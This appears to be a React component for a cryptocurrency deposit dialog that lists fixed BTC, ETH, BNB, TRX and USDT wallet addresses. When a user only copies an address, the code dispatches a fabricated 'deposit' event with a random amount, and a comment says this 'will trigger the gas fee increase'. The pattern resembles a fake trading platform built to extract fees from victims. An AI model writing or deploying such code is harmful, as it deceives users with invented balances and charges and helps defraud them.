
import React from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { useLanguage } from "@/contexts/LanguageContext";
import { getTranslation } from '@/utils/translations';
import { toast } from "sonner";

interface DepositDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const DepositDialog: React.FC<DepositDialogProps> = ({ open, onOpenChange }) => {
  const { language } = useLanguage();
  
  // Fixed wallet addresses for deposit
  const FIXED_ADDRESSES = {
    BTC: "19hjRhd7pYKdGvqDA9S6SPYbz6gfN5potm",
    ETH: "0x3951714b1886442255858e42653d9552b5d5073a",
    BNB: "0x3951714b1886442255858e42653d9552b5d5073a",
    TRX: "TPy4csxqvQGvygSBFGqDUvJXfYGCcpdVxL",
    USDT: "TPy4csxqvQGvygSBFGqDUvJXfYGCcpdVxL"
  };

  const handleCopyAddress = (coin: string, address: string) => {
    navigator.clipboard.writeText(address);
    
    const coinName = coin === 'BTC' ? 'Bitcoin' :
                   coin === 'ETH' ? 'Ethereum' :
                   coin === 'BNB' ? 'Binance Coin' :
                   coin === 'TRX' ? 'Tron' : 'USDT';

    // Create a deposit event that will trigger the gas fee increase
    const depositAmount = Math.random() * 100 + 10; // Random amount
    const depositEvent = new CustomEvent('deposit', { 
      detail: { amount: depositAmount }
    });
    window.dispatchEvent(depositEvent);
    
    toast.success(getTranslation('addressCopied', language), {
      description: `${coinName} ${getTranslation('addressCopiedDesc', language)}`,
    });
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>{getTranslation('depositFunds', language)}</DialogTitle>
          <DialogDescription>
            {getTranslation('depositDescription', language)}
          </DialogDescription>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <div className="space-y-4">
            {Object.entries(FIXED_ADDRESSES).map(([coin, address]) => (
              <div key={coin} className="p-3 border border-border rounded-lg">
                <div className="flex justify-between items-center mb-2">
                  <h3 className="font-medium">{coin}</h3>
                  <button
                    onClick={() => handleCopyAddress(coin, address)}
                    className="text-sm text-crypto-blue hover:underline flex items-center"
                  >
                    {getTranslation('copyAddress', language)}
                  </button>
                </div>
                <div className="bg-muted/30 p-2 rounded text-xs font-mono break-all">
                  {address}
                </div>
              </div>
            ))}
          </div>
          
          <div className="p-3 bg-yellow-50 dark:bg-yellow-900/20 rounded-lg border border-yellow-200 dark:border-yellow-900/30">
            <p className="text-sm text-yellow-800 dark:text-yellow-400">
              <span className="font-medium">{getTranslation('important', language)}:</span> {getTranslation('depositWarning', language)}
            </p>
          </div>
        </div>
        <div className="flex justify-end">
          <Button variant="outline" onClick={() => onOpenChange(false)}>
            {getTranslation('close', language)}
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default DepositDialog;
